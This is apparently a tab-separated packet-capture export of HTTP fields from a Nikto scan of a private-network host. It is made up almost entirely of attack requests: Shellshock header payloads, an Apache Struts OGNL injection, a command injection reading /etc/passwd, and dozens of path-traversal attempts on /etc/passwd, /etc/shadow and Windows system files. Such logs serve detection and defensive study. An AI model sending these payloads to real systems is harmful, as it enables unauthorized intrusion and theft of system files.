http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									1616					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/status
																	Keep-Alive										192.168.1.101									1617					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/sysinfo.pl
																	Keep-Alive										192.168.1.101									1618					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test
																	Keep-Alive										192.168.1.101									1619					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi
																	Keep-Alive										192.168.1.101									1620					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi
																	Keep-Alive										192.168.1.101									1621					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.php
																	Keep-Alive										192.168.1.101									1622					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi.php
																	Keep-Alive										192.168.1.101									1623					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.pl
																	Keep-Alive										192.168.1.101									1624					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi.pl
																	Keep-Alive										192.168.1.101									1625					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.py
																	Keep-Alive										192.168.1.101									1626					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.sh
																	Keep-Alive										192.168.1.101									1627					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/tmUnblock.cgi
																	Keep-Alive										192.168.1.101									1628					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/uname.cgi
																	Keep-Alive										192.168.1.101									1629					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/viewcvs.cgi
																	Keep-Alive										192.168.1.101									1630					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/welcome
																	Keep-Alive										192.168.1.101									1631					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/whois.cgi
																	Keep-Alive										192.168.1.101									1632					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									1633						1	http://192.168.1.101/web/../../../../../../../../../../../../etc/shadow		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:dishwasher)				/web/../../../../../../../../../../../../etc/shadow
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101															1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									1639						1	http://192.168.1.101/web/index.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/index.action
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									1642						1	http://192.168.1.101/web/login.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/login.action
																	Keep-Alive										192.168.1.101									1644						1	http://192.168.1.101/web/cfappman/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000013)				/web/cfappman/index.cfm
																	Keep-Alive										192.168.1.101									1646						1	http://192.168.1.101/web/cfdocs/examples/cvbeans/beaninfo.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000014)				/web/cfdocs/examples/cvbeans/beaninfo.cfm
																	Keep-Alive										192.168.1.101									1648						1	http://192.168.1.101/web/cfdocs/examples/parks/detail.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000015)				/web/cfdocs/examples/parks/detail.cfm
																	Keep-Alive										192.168.1.101									1650						1	http://192.168.1.101/web/kboard/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000016)				/web/kboard/
																	Keep-Alive										192.168.1.101									1652						1	http://192.168.1.101/web/lists/admin/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000017)				/web/lists/admin/
																	Keep-Alive										192.168.1.101									1654						1	http://192.168.1.101/web/splashAdmin.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000018)				/web/splashAdmin.php
																	Keep-Alive										192.168.1.101									1656						1	http://192.168.1.101/web/ssdefs/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000019)				/web/ssdefs/
																	Keep-Alive										192.168.1.101									1658						1	http://192.168.1.101/web/sshome/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000020)				/web/sshome/
																	Keep-Alive										192.168.1.101									1660						1	http://192.168.1.101/web/tiki/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000021)				/web/tiki/
																	Keep-Alive										192.168.1.101									1662						1	http://192.168.1.101/web/tiki/tiki-install.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000022)				/web/tiki/tiki-install.php
																	Keep-Alive										192.168.1.101									1663						1	http://192.168.1.101/web/scripts/samples/details.idc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000023)				/web/scripts/samples/details.idc
																	Keep-Alive										192.168.1.101									1664						1	http://192.168.1.101/web/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000053)				/web/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
																	Keep-Alive										192.168.1.101									1665						1	http://192.168.1.101/web/admin/browse.asp?FilePath=c:\&Opt=2&level=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000102)				/web/admin/browse.asp?FilePath=c:\&Opt=2&level=0
																	Keep-Alive										192.168.1.101									1666						1	http://192.168.1.101/web/view_source.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000182)				/web/view_source.jsp
																	Keep-Alive										192.168.1.101									1667						1	http://192.168.1.101/web/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000339)				/web/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
																	Keep-Alive										192.168.1.101									1668						1	http://192.168.1.101/web/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000408)				/web/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
																	Keep-Alive										192.168.1.101									1669						1	http://192.168.1.101/web/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000408)				/web/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
																	Keep-Alive										192.168.1.101									1670						1	http://192.168.1.101/web/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000408)				/web/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
																	Keep-Alive										192.168.1.101									1671						1	http://192.168.1.101/web/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000408)				/web/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
																	Keep-Alive										192.168.1.101									1672						1	http://192.168.1.101/web/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000408)				/web/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
																	Keep-Alive										192.168.1.101									1673						1	http://192.168.1.101/web/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000490)				/web/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
																	Keep-Alive										192.168.1.101									1674						1	http://192.168.1.101/web/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000668)				/web/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
																	Keep-Alive										192.168.1.101									1675						1	http://192.168.1.101/web/..\..\..\..\..\..\temp\temp.class		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000671)				/web/..\..\..\..\..\..\temp\temp.class
																	Keep-Alive										192.168.1.101									1676						1	http://192.168.1.101/web/../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000672)				/web/../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/.../.../.../.../.../.../.../.../.../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000673)				/web/.../.../.../.../.../.../.../.../.../boot.ini
																	Keep-Alive										192.168.1.101									1681						1	http://192.168.1.101/web/................../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000674)				/web/................../etc/passwd
																	Keep-Alive										192.168.1.101									1683						1	http://192.168.1.101/web/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000677)				/web/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000678)				/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000680)				/web/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini
																	Keep-Alive										192.168.1.101									1695						1	http://192.168.1.101/web/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000681)				/web/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd
																	Keep-Alive										192.168.1.101									1697						1	http://192.168.1.101/web/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000682)				/web/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini
																	Keep-Alive										192.168.1.101									1699						1	http://192.168.1.101/web/cfdocs/snippets/viewexample.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001006)				/web/cfdocs/snippets/viewexample.cfm
																	Keep-Alive										192.168.1.101									1701						1	http://192.168.1.101/web/Mem/dynaform/FileExplorer.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001026)				/web/Mem/dynaform/FileExplorer.htm
																	Keep-Alive										192.168.1.101									1703						1	http://192.168.1.101/web/ext.ini.%00.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001089)				/web/ext.ini.%00.txt
																	Keep-Alive										192.168.1.101									1705						1	http://192.168.1.101/web/krysalis/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001156)				/web/krysalis/
																	Keep-Alive										192.168.1.101									1707						1	http://192.168.1.101/web///		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001208)				/web///
																	Keep-Alive										192.168.1.101									1709						1	http://192.168.1.101/web/manager/contextAdmin/contextAdmin.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001226)				/web/manager/contextAdmin/contextAdmin.html
																	Keep-Alive										192.168.1.101									1712						1	http://192.168.1.101/web/jk-manager/contextAdmin/contextAdmin.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001226)				/web/jk-manager/contextAdmin/contextAdmin.html
																	Keep-Alive										192.168.1.101									1713						1	http://192.168.1.101/web/jk-status/contextAdmin/contextAdmin.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001226)				/web/jk-status/contextAdmin/contextAdmin.html
																	Keep-Alive										192.168.1.101									1714						1	http://192.168.1.101/web/admin/contextAdmin/contextAdmin.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001226)				/web/admin/contextAdmin/contextAdmin.html
																	Keep-Alive										192.168.1.101									1715						1	http://192.168.1.101/web/host-manager/contextAdmin/contextAdmin.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001226)				/web/host-manager/contextAdmin/contextAdmin.html
																	Keep-Alive										192.168.1.101									1716						1	http://192.168.1.101/web/scripts/samples/search/qfullhit.htw		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001246)				/web/scripts/samples/search/qfullhit.htw
																	Keep-Alive										192.168.1.101									1717						1	http://192.168.1.101/web/scripts/samples/search/qsumrhit.htw		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001247)				/web/scripts/samples/search/qsumrhit.htw
																	Keep-Alive										192.168.1.101									1718						1	http://192.168.1.101/web/mYXRD.htw		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001248)				/web/mYXRD.htw
																	Keep-Alive										192.168.1.101									1719						1	http://192.168.1.101/web/file/../../../../../../../../etc/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001252)				/web/file/../../../../../../../../etc/
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001354)				/web/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu
																	Keep-Alive										192.168.1.101									1724						1	http://192.168.1.101/web/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001362)				/web/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc
																	Keep-Alive										192.168.1.101									1726						1	http://192.168.1.101/web/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001363)				/web/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd
																	Keep-Alive										192.168.1.101									1728						1	http://192.168.1.101/web/axis-cgi/buffer/command.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001374)				/web/axis-cgi/buffer/command.cgi
																	Keep-Alive										192.168.1.101									1730						1	http://192.168.1.101/web/cgi-bin/pfdisplay.cgi?../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001413)				/web/cgi-bin/pfdisplay.cgi?../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1732						1	http://192.168.1.101/web../../../../../../../../../../etc/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001475)				/web../../../../../../../../../../etc/*
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web../../../../../../../../../../etc/passw*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001476)				/web../../../../../../../../../../etc/passw*
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/bytehoard/index.php?infolder=../../../../../../../../../../../etc/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001477)				/web/bytehoard/index.php?infolder=../../../../../../../../../../../etc/
																	Keep-Alive										192.168.1.101									1744						1	http://192.168.1.101/web/OpenFile.aspx?file=../../../../../../../../../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001482)				/web/OpenFile.aspx?file=../../../../../../../../../../boot.ini
																	Keep-Alive										192.168.1.101									1746						1	http://192.168.1.101/web/.../.../.../.../.../.../.../.../.../.../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001488)				/web/.../.../.../.../.../.../.../.../.../.../etc/passwd
																	Keep-Alive										192.168.1.101									1748						1	http://192.168.1.101/web/scripts/cphost.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002088)				/web/scripts/cphost.dll
																	Keep-Alive										192.168.1.101									1750						1	http://192.168.1.101/web////../../data/config/microsrv.cfg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002761)				/web////../../data/config/microsrv.cfg
																	Keep-Alive										192.168.1.101									1752						1	http://192.168.1.101/web////////../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002762)				/web////////../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									1754						1	http://192.168.1.101/web/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003023)				/web/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini
																	Keep-Alive										192.168.1.101									1756						1	http://192.168.1.101/web/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003024)				/web/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini
																	Keep-Alive										192.168.1.101									1758						1	http://192.168.1.101/web/mlog.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003057)				/web/mlog.html
																	Keep-Alive										192.168.1.101									1760						1	http://192.168.1.101/web/mlog.phtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003058)				/web/mlog.phtml
																	Keep-Alive										192.168.1.101									1762						1	http://192.168.1.101/web/mylog.html?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003059)				/web/mylog.html?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									1764						1	http://192.168.1.101/web/mylog.phtml?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003060)				/web/mylog.phtml?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									1766						1	http://192.168.1.101/web/php/mlog.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003061)				/web/php/mlog.html
																	Keep-Alive										192.168.1.101									1768						1	http://192.168.1.101/web/php/mlog.phtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003062)				/web/php/mlog.phtml
																	Keep-Alive										192.168.1.101									1770						1	http://192.168.1.101/web/php/mylog.html?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003063)				/web/php/mylog.html?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									1772						1	http://192.168.1.101/web/php/mylog.phtml?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003064)				/web/php/mylog.phtml?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									1773						1	http://192.168.1.101/web/fi?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003065)				/web/fi?/etc/passwd
																	Keep-Alive										192.168.1.101									1774						1	http://192.168.1.101/web/directory.php?dir=%3Bcat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003070)				/web/directory.php?dir=%3Bcat%20/etc/passwd
																	Keep-Alive										192.168.1.101									1775						1	http://192.168.1.101/web/content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003071)				/web/content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:
																	Keep-Alive										192.168.1.101									1776						1	http://192.168.1.101/web/content/base/build/explorer/none.php?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003072)				/web/content/base/build/explorer/none.php?/etc/passwd
																	Keep-Alive										192.168.1.101									1777						1	http://192.168.1.101/web/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									1778						1	http://192.168.1.101/web/postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
